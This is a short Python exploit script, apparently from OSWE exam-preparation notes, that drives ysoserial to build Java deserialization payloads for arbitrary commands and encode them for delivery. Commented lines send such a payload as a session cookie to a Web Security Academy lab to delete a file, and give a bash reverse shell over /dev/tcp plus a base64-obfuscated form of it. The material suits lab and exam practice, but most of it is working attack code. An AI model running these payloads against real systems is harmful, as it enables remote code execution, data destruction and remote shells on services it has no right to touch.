# From: https://jorgectf.gitbook.io/awae-oswe-preparation-resources/general/pocs/deserialization/java/ysoserial
# Download ysoserial from https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar

import subprocess
import base64
import urllib.parse

def get_ysoserial_payload(command, payloadType, path_to_ysoserial='ysoserial.jar'):
    # java -jar ysoserial.jar CommonsCollections4 'touch /tmp/worked'
    # java -jar ysoserial-0.0.4-all.jar CommonsCollections4 'shell command...' | base64 | tr -d "\n"
    proc = subprocess.check_output(['java', '-jar', path_to_ysoserial, payloadType, command])
    base64_payload = base64.b64encode(proc).decode()
    urlEncoded_payload = urllib.parse.quote(base64_payload)
    return urlEncoded_payload

payload = get_ysoserial_payload('command', 'payload')

# payload = get_ysoserial_payload('rm /home/carlos/morale.txt', 'CommonsCollections4')
# print(payload)
# req = requests.get('https://YOUR-SESSION.web-security-academy.net/', cookies={'session': payload})
# print(req.text)

# http://www.jackson-t.ca/runtime-exec-payloads.html
# echo "bash -i >& /dev/tcp/127.0.0.1/1234 0>&1" | base64
# bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMTIzNCAwPiYxCg==}|{base64,-d}|{bash,-i}